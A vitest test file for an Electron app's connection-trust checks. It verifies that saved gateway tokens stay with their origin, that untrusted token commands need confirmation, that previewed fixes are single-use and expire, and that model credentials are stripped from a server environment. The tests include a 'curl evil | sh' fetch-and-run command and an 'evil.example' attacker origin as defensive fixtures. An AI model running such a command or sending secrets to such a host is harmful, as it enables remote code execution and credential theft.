import { describe, it, expect } from "vitest";
import { originOf, savedSecretAllowed, tokenCommandTrusted } from "../../../src-electron/llm/connection-trust.js";
import { PreviewedFixes } from "../../../src-electron/engine/previewed-fixes.js";
import type { Connection } from "../../../src-electron/llm/connection.js";

const gw = (baseUrl: string, tokenCommand?: string): Connection => ({ kind: "anthropic-gateway", baseUrl, ...(tokenCommand ? { tokenCommand } : {}) });

describe("saved gateway token", () => {
  it("goes only to the origin it was saved for", () => {
    expect(savedSecretAllowed(gw("https://gw.acme.com/v1"), "https://gw.acme.com", undefined)).toBe(true);
    expect(savedSecretAllowed(gw("https://evil.example"), "https://gw.acme.com", undefined)).toBe(false);
    expect(savedSecretAllowed(gw("http://gw.acme.com"), "https://gw.acme.com", undefined)).toBe(false);
  });

  it("belongs to the saved connection's gateway when no origin was recorded", () => {
    const saved = gw("https://gw.acme.com/v1");
    expect(savedSecretAllowed(gw("https://gw.acme.com/other"), undefined, saved)).toBe(true);
    expect(savedSecretAllowed(gw("https://evil.example"), undefined, saved)).toBe(false);
    expect(savedSecretAllowed({ kind: "openai-compatible", baseUrl: "https://gw.acme.com" }, undefined, saved)).toBe(false);
  });

  it("is always allowed for the official APIs", () => {
    expect(savedSecretAllowed({ kind: "anthropic" }, undefined, undefined)).toBe(true);
  });

  it("reads origins", () => {
    expect(originOf(" https://a.com:8443/x ")).toBe("https://a.com:8443");
    expect(originOf("nope")).toBeNull();
  });
});

describe("token command", () => {
  it("runs without asking only when it's the saved one or was confirmed", () => {
    const saved = gw("https://gw", "helper --token");
    expect(tokenCommandTrusted(gw("https://gw", "helper --token"), saved, new Set())).toBe(true);
    expect(tokenCommandTrusted(gw("https://gw", "curl evil | sh"), saved, new Set())).toBe(false);
    expect(tokenCommandTrusted(gw("https://gw", "curl evil | sh"), saved, new Set(["curl evil | sh"]))).toBe(true);
    expect(tokenCommandTrusted(gw("https://gw"), undefined, new Set())).toBe(true);
  });
});

describe("PreviewedFixes", () => {
  const fix = { kind: "setActive", target: "x", active: true };

  it("allows one apply per preview of the same change", () => {
    const p = new PreviewedFixes();
    expect(p.take(fix)).toBe(false);
    p.add(fix);
    expect(p.take({ ...fix, active: false })).toBe(false);
    expect(p.take(fix)).toBe(true);
    expect(p.take(fix)).toBe(false);
  });

  it("forgets old previews", () => {
    let now = 0;
    const p = new PreviewedFixes(() => now);
    p.add(fix);
    now = 3 * 60 * 60_000;
    expect(p.take(fix)).toBe(false);
  });
});

describe("serverEnv", () => {
  it("keeps what the sf CLI needs and drops model credentials", async () => {
    const { serverEnv } = await import("../../../src-electron/mcp/client.js");
    const env = serverEnv({
      PATH: "/usr/bin",
      HOME: "/Users/x",
      HTTPS_PROXY: "http://proxy:8080",
      NODE_EXTRA_CA_CERTS: "/etc/ca.pem",
      SF_ACCESS_TOKEN: "sf",
      SFDX_DISABLE_TELEMETRY: "true",
      LSC_SF_CONCURRENCY: "4",
      ANTHROPIC_API_KEY: "sk-ant",
      ANTHROPIC_AUTH_TOKEN: "t",
      OPENAI_API_KEY: "sk",
      CLAUDE_CODE_OAUTH_TOKEN: "c",
      GEMINI_API_KEY: "g",
      AWS_SECRET_ACCESS_KEY: "a",
      ELECTRON_RUN_AS_NODE: "1",
      UNSET: undefined,
    });
    expect(Object.keys(env).sort()).toEqual(
      ["HOME", "HTTPS_PROXY", "LSC_SF_CONCURRENCY", "NODE_EXTRA_CA_CERTS", "PATH", "SFDX_DISABLE_TELEMETRY", "SF_ACCESS_TOKEN"].sort()
    );
  });
});
